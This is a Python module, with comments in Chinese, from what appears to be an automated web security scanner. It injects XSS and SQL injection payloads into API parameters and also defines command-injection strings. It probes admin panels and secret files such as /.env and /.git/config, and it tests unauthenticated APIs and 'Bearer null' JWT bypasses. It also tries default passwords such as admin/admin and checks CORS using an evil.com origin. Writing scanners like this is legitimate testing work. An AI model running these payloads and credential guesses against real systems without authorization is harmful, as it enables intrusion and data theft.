"""
动态攻击模块 - 对发现的 API 端点主动注入 payload

区别于静态扫描：
  - 不只是"看看有没有 .git"
  - 而是"对每个 API 发攻击 payload，看有没有漏洞"
"""

import re
import json
import time
import urllib.parse
from typing import List, Dict
from secops_core.logger import get_logger
from secops_core.config import ATTACK_DELAY

log = get_logger("dynamic_attack")


class DynamicAttacker:
    """
    动态攻击器
    
    用法：
        attacker = DynamicAttacker(page, context)
        findings = attacker.attack_api_endpoints(endpoints)
        findings += attacker.fuzz_common_paths(base_url)
        findings += attacker.test_auth_bypass(base_url)
    """

    def __init__(self, page, context):
        self.page = page
        self.context = context
        self.findings = []

    def attack_api_endpoints(self, endpoints: list) -> list:
        """对发现的 API 端点进行动态 fuzz"""
        from secops_offense.attack_engine.finding import Finding

        findings = []
        xss_payloads = ['"><img src=x onerror=alert(1)>', "<script>alert(1)</script>", "'-alert(1)-'"]
        sqli_payloads = ["'", "' OR 1=1--", "1' UNION SELECT NULL--", "' AND SLEEP(5)--"]
        cmdi_payloads = ["; id", "| whoami", "$(whoami)"]

        for endpoint in endpoints:
            # 解析 URL 和参数
            parsed = urllib.parse.urlparse(endpoint)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = dict(urllib.parse.parse_qsl(parsed.query))

            if not params:
                continue

            # 对每个参数注入 payload
            for param_name in params:
                original_value = params[param_name]

                # XSS 注入
                for payload in xss_payloads[:2]:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    test_url = f"{base}?{urllib.parse.urlencode(test_params)}"

                    try:
                        resp = self.context.request.get(test_url, timeout=5000)
                        body = resp.text()
                        if payload in body:
                            findings.append(Finding(
                                vuln_type="XSS", severity="high",
                                title=f"API 反射型 XSS - {parsed.path} 参数 {param_name}",
                                location=test_url, payload=payload,
                                evidence="Payload 在 API 响应中完整反射",
                                description=f"API 参数 {param_name} 未过滤用户输入。",
                                remediation="对 API 响应进行 HTML 编码，设置 Content-Type: application/json"
                            ))
                            break
                    except Exception:
                        pass

                # SQLi 注入（报错型）
                for payload in sqli_payloads[:3]:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    test_url = f"{base}?{urllib.parse.urlencode(test_params)}"

                    try:
                        resp = self.context.request.get(test_url, timeout=5000)
                        body = resp.text()
                        error_patterns = [
                            r"SQL syntax.*MySQL", r"PostgreSQL.*ERROR", r"ORA-[0-9]{4}",
                            r"SQLite.*Error", r"mysql_fetch", r"syntax error",
                        ]
                        for pattern in error_patterns:
                            if re.search(pattern, body, re.IGNORECASE):
                                findings.append(Finding(
                                    vuln_type="SQLi", severity="critical",
                                    title=f"API 报错型 SQL 注入 - {parsed.path}",
                                    location=test_url, payload=payload,
                                    evidence=f"数据库报错: {re.search(pattern, body).group()[:100]}",
                                    description=f"API 参数 {param_name} 存在 SQL 注入。",
                                    remediation="使用参数化查询"
                                ))
                                break
                    except Exception:
                        pass

                time.sleep(ATTACK_DELAY)

        return findings

    def fuzz_common_paths(self, base_url: str) -> list:
        """fuzz 常见管理后台和敏感路径"""
        from secops_offense.attack_engine.finding import Finding

        findings = []
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 管理后台路径
        admin_paths = [
            "/admin", "/admin/", "/administrator/", "/manage/", "/dashboard/",
            "/backend/", "/panel/", "/control/", "/console/",
            "/wp-admin/", "/wp-login.php", "/phpmyadmin/",
            "/admin/login", "/login", "/signin", "/auth/login",
            "/api/admin", "/api/v1/admin", "/api/user/admin",
            "/swagger-ui.html", "/swagger/", "/api-docs",
            "/graphql", "/graphiql",
            "/debug", "/trace", "/actuator", "/actuator/env", "/actuator/health",
            "/.env", "/.git/config", "/.git/HEAD",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/server-status", "/server-info", "/info.php", "/phpinfo.php",
            "/config.json", "/config.js", "/settings.json",
            "/api/config", "/api/settings", "/api/debug",
            "/test", "/test/", "/debug/", "/dev/",
            "/backup", "/backup.sql", "/dump.sql", "/db.sql",
            "/uploads/", "/upload/", "/files/", "/static/",
        ]

        for path in admin_paths:
            url = base + path
            try:
                resp = self.context.request.get(url, timeout=3000)
                status = resp.status
                body = resp.text()
                body_len = len(body)

                if status == 200 and body_len > 50:
                    # 排除 SPA 回退壳
                    spa_indicators = ['<div id="app">', '<div id="root">', 'uni.', '.css">']
                    if sum(1 for ind in spa_indicators if ind in body) >= 2:
                        continue  # 这是 SPA 壳，不是真实内容

                    # 检查是否是真实的管理页面
                    is_admin = False
                    severity = "low"

                    # 检查页面特征
                    admin_indicators = ["login", "password", "admin", "dashboard", "管理", "登录", "后台"]
                    if any(ind in body.lower() for ind in admin_indicators):
                        is_admin = True
                        severity = "high"

                    # 检查是否暴露敏感信息
                    if path in ("/.env", "/.git/HEAD", "/.git/config", "/actuator/env"):
                        severity = "critical"
                    elif path in ("/swagger-ui.html", "/api-docs", "/graphql", "/phpinfo.php"):
                        severity = "high"

                    if is_admin or severity in ("high", "critical"):
                        findings.append(Finding(
                            vuln_type="InfoLeak" if not is_admin else "AdminPanel",
                            severity=severity,
                            title=f"{'管理后台' if is_admin else '敏感路径'}暴露: {path}",
                            location=url, payload="GET " + path,
                            evidence=f"HTTP {status}, {body_len} bytes",
                            description=f"路径 {path} 可访问{'，可能是管理后台' if is_admin else ''}。",
                            remediation="限制管理后台访问来源，配置认证"
                        ))
            except Exception:
                pass

            time.sleep(0.1)

        return findings

    def test_auth_bypass(self, base_url: str) -> list:
        """测试认证绕过"""
        from secops_offense.attack_engine.finding import Finding

        findings = []
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 1. 测试常见 API 无认证访问
        api_paths = [
            "/api/user", "/api/users", "/api/profile", "/api/me",
            "/api/admin", "/api/admin/users", "/api/config",
            "/api/v1/user", "/api/v1/users", "/api/v1/admin",
        ]

        for path in api_paths:
            url = base + path
            try:
                resp = self.context.request.get(url, timeout=3000)
                body = resp.text()
                status = resp.status

                # 如果返回 200 且包含用户数据，说明未鉴权
                if status == 200 and body:
                    try:
                        data = json.loads(body)
                        if isinstance(data, dict) and any(k in str(data).lower() for k in ["email", "phone", "password", "token", "secret", "role"]):
                            findings.append(Finding(
                                vuln_type="AuthBypass", severity="critical",
                                title=f"API 未鉴权 - {path}",
                                location=url, payload="GET " + path,
                                evidence=f"未认证访问返回用户数据: {body[:200]}",
                                description=f"API {path} 无需认证即可访问敏感数据。",
                                remediation="对所有敏感 API 添加认证中间件"
                            ))
                    except json.JSONDecodeError:
                        pass
            except Exception:
                pass

            time.sleep(0.1)

        # 2. 测试 JWT 空签名
        jwt_paths = ["/api/user", "/api/admin", "/api/v1/user"]
        for path in jwt_paths:
            url = base + path
            try:
                # 空 Authorization header
                resp = self.context.request.get(url, headers={"Authorization": "Bearer null"}, timeout=3000)
                if resp.status == 200 and len(resp.text()) > 50:
                    try:
                        data = json.loads(resp.text())
                        if isinstance(data, dict) and data.get("code") not in [401, 403, "401", "403"]:
                            findings.append(Finding(
                                vuln_type="AuthBypass", severity="high",
                                title=f"JWT 空认证绕过 - {path}",
                                location=url, payload="Bearer null",
                                evidence=f"空 JWT 返回有效数据",
                                description=f"API {path} 接受空 JWT token。",
                                remediation="验证 JWT 签名和有效期"
                            ))
                    except json.JSONDecodeError:
                        pass
            except Exception:
                pass

        # 3. 测试默认密码
        login_paths = ["/api/login", "/api/auth/login", "/admin/login", "/login"]
        default_creds = [
            ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
            ("root", "root"), ("test", "test"), ("admin", "admin123"),
        ]

        for login_path in login_paths:
            url = base + login_path
            try:
                # 先检查登录页面是否存在
                resp = self.context.request.get(url, timeout=3000)
                if resp.status != 200:
                    continue

                for username, password in default_creds[:3]:
                    # 尝试 POST 登录
                    try:
                        resp = self.context.request.post(url, data={
                            "username": username, "password": password,
                            "email": username, "pass": password,
                        }, timeout=3000)

                        body = resp.text()
                        # 检查是否登录成功
                        success_indicators = ["token", "success", "welcome", "dashboard", "欢迎"]
                        fail_indicators = ["error", "invalid", "incorrect", "fail", "错误", "失败"]

                        if any(ind in body.lower() for ind in success_indicators):
                            if not any(ind in body.lower() for ind in fail_indicators):
                                findings.append(Finding(
                                    vuln_type="WeakPassword", severity="critical",
                                    title=f"默认密码: {login_path} ({username}/{password})",
                                    location=url, payload=f"{username}:{password}",
                                    evidence=f"登录返回成功: {body[:100]}",
                                    description=f"登录接口 {login_path} 使用默认凭据 {username}/{password}。",
                                    remediation="修改默认密码，实施密码复杂度策略"
                                ))
                                break
                    except Exception:
                        pass

                    time.sleep(0.2)
            except Exception:
                pass

        return findings

    def test_cors_misconfig(self, base_url: str) -> list:
        """测试 CORS 配置错误"""
        from secops_offense.attack_engine.finding import Finding

        findings = []
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        try:
            resp = self.context.request.get(base, headers={
                "Origin": "https://evil.com"
            }, timeout=5000)

            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")

            if acao == "*":
                findings.append(Finding(
                    vuln_type="CORS", severity="medium",
                    title="CORS 配置错误: Allow-Origin *",
                    location=base, payload="Origin: https://evil.com",
                    evidence=f"Access-Control-Allow-Origin: *",
                    description="CORS 允许所有来源，可能导致跨域数据泄露。",
                    remediation="限制 Allow-Origin 为信任域名"
                ))
            elif "evil.com" in acao and acac.lower() == "true":
                findings.append(Finding(
                    vuln_type="CORS", severity="high",
                    title="CORS 配置错误: 反射 Origin + 凭证",
                    location=base, payload="Origin: https://evil.com",
                    evidence=f"ACAO: {acao}, ACAC: {acac}",
                    description="CORS 反射任意 Origin 且允许凭证，攻击者可窃取用户数据。",
                    remediation="验证 Origin 白名单，不要与凭证同时使用通配符"
                ))
        except Exception:
            pass

        return findings
